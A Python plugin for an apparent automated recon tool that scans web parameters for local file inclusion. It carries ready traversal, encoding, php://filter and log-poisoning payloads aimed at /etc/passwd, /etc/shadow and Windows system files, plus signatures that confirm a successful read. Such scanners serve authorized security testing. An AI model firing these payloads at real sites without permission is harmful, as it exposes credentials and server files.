#!/usr/bin/env python3
"""
LFI Scanner Plugin - Detecta vulnerabilidades de Local File Inclusion
"""

import requests
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
sys.path.append('..')
from plugin_system import PluginInterface


class LFIScannerPlugin(PluginInterface):
    """Plugin para detectar LFI (Local File Inclusion) vulnerabilities."""

    name = "lfi_scanner"
    version = "1.0.0"
    author = "Auto Recon System"
    description = "Automated LFI (Local File Inclusion) vulnerability scanner"
    category = "vuln_scan"
    requires = ["requests"]

    # Payloads LFI - Linux
    LFI_LINUX_PAYLOADS = [
        # Direct
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/group",
        "/proc/self/environ",
        "/proc/version",
        "/proc/cmdline",

        # Traversal
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",

        # Encoded traversal
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoded

        # NULL byte (older PHP versions)
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",

        # Wrapper
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/resource=/etc/passwd",

        # Log poisoning paths
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
    ]

    # Payloads LFI - Windows
    LFI_WINDOWS_PAYLOADS = [
        # Direct
        "C:\\windows\\win.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\boot.ini",

        # Traversal
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",

        # Encoded
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
    ]

    # Indicadores de LFI bem-sucedido
    LFI_INDICATORS = {
        '/etc/passwd': [b'root:x:0:0:', b'/bin/bash', b'/bin/sh'],
        '/etc/shadow': [b'root:$', b'$6$', b'$5$'],
        '/etc/hosts': [b'127.0.0.1', b'localhost'],
        '/etc/group': [b'root:x:0:'],
        '/proc/version': [b'Linux version', b'gcc version'],
        'win.ini': [b'[fonts]', b'[extensions]'],
        'hosts': [b'127.0.0.1'],
        'boot.ini': [b'[boot loader]', b'[operating systems]'],
    }

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Escaneia URL para LFI.

        Args:
            target: URL alvo
            **kwargs:
                method: GET|POST (default: GET)
                params: Parâmetros (opcional)
                timeout: Timeout (default: 5)
                os: linux|windows|both (default: linux)

        Returns:
            Dicionário com vulnerabilidades
        """
        method = kwargs.get('method', 'GET').upper()
        params = kwargs.get('params', {})
        timeout = kwargs.get('timeout', 5)
        os_type = kwargs.get('os', 'linux')

        print(f"[*] Scanning {target} for LFI vulnerabilities...")

        vulnerabilities = []

        # Parse URL
        parsed = urlparse(target)

        # Extrai parâmetros
        if not params:
            params = parse_qs(parsed.query)
            params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}

        if not params:
            print("[!] No parameters found to test")
            return {
                'vulnerabilities': [],
                'count': 0,
                'message': 'No parameters to test'
            }

        # Seleciona payloads baseado no OS
        if os_type == 'linux':
            payloads = self.LFI_LINUX_PAYLOADS
        elif os_type == 'windows':
            payloads = self.LFI_WINDOWS_PAYLOADS
        elif os_type == 'both':
            payloads = self.LFI_LINUX_PAYLOADS + self.LFI_WINDOWS_PAYLOADS
        else:
            payloads = self.LFI_LINUX_PAYLOADS

        # Testa cada parâmetro
        for param_name in params.keys():
            print(f"[*] Testing parameter: {param_name}")

            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = payload

                try:
                    if method == 'GET':
                        # Reconstrói URL
                        query_string = urlencode(test_params)
                        test_url = urlunparse((
                            parsed.scheme,
                            parsed.netloc,
                            parsed.path,
                            parsed.params,
                            query_string,
                            parsed.fragment
                        ))

                        response = requests.get(test_url, timeout=timeout, verify=False)
                    else:
                        response = requests.post(target, data=test_params, timeout=timeout, verify=False)

                    # Verifica indicadores
                    is_vulnerable, indicator = self._check_lfi_indicators(response.content, payload)

                    if is_vulnerable:
                        vuln = {
                            'type': 'lfi',
                            'severity': 'high',
                            'url': target,
                            'parameter': param_name,
                            'payload': payload,
                            'method': method,
                            'description': f'LFI vulnerability in parameter "{param_name}"',
                            'impact': 'Attacker can read sensitive files from server',
                            'remediation': 'Validate file paths against whitelist, avoid user input in file operations',
                            'evidence': {
                                'indicator': indicator,
                                'response_length': len(response.content)
                            }
                        }

                        vulnerabilities.append(vuln)

                        print(f"[!] VULNERABLE! Parameter: {param_name}, Payload: {payload}")

                        # Para de testar este parâmetro
                        break

                except:
                    pass

        print(f"\n[+] Found {len(vulnerabilities)} LFI vulnerabilities")

        self.results = vulnerabilities

        return {
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities),
            'target': target
        }

    def _check_lfi_indicators(self, content: bytes, payload: str) -> tuple:
        """Verifica indicadores de LFI bem-sucedido."""

        # Determina qual arquivo foi solicitado
        for file_pattern, indicators in self.LFI_INDICATORS.items():
            if file_pattern in payload.lower():
                # Verifica se conteúdo contém indicadores deste arquivo
                for indicator in indicators:
                    if indicator in content:
                        return True, f"found: {indicator.decode('utf-8', errors='ignore')}"

        return False, ""
